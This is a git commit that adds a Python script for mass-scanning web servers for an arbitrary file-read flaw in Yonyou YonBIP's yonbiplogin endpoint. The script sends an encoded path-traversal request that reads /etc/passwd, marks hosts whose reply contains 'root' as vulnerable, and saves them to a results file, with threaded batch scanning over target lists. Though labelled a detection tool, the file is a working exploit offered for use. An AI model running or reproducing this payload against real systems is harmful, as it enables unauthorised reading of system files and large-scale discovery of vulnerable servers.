ba61835510008bb9e47156e8146476075fc3a5c7
Bu0uCat <17635240329@163.COM>
2024-12-09 14:02:52 +0800

    Add files via upload

---
+++ YUFileRead.py
@@ -0,0 +1,61 @@
+import requests
+import argparse
+import concurrent.futures
+
+def checkVuln(url):
+    headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+            'Connection': 'close',
+            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Encoding':'gzip, deflate, br'
+    }
+    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+    try:
+        req = requests.get(f"{url}iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js",
+                           headers=headers,timeout=10,verify=False)
+        if req.status_code == 200 and req.text:
+            if 'root' in req.text:
+                print(f"\033[1;32m[+] 存在任意文件读取漏洞{url}")
+                with open("reselust.txt",'a') as f:
+                    f.write(f"{url}\n")
+                    f.close()
+            else:
+                print(f"\033[1;31m[-] 该目标不存在此漏洞!")
+        else:
+            print(f"\033[1;31m[-] 该目标不存在此漏洞!")
+    except Exception:
+        print(f"\033[1;31m[-] 连接 {url} 发生了问题!")
+
+
+def banner():
+    print("""
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓███████▓▒░░▒▓████████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+   ░▒▓█▓▒░    ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+                                                                                                               By:Bu0uCat                                                                                                                         
+                                                                                                                             """)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="这是一个检测用友YonBIP高级版yonbiplogin任意文件读取检测程序")
+    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
+    parser.add_argument("-f", "--file", type=str, help="指定批量检测文件")
+    args = parser.parse_args()
+
+    if args.url:
+        banner()
+        checkVuln(args.url)
+    elif args.file:
+        banner()
+        f = open(args.file, 'r')
+        targets = f.read().splitlines()
+        # 使用线程池并发执行检查漏洞
+        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+            executor.map(checkVuln, targets)
+    else:
+        banner()
+        print("-u,--url 指定需要检测的URL")
+        print("-f,--file 指定需要批量检测的文件")
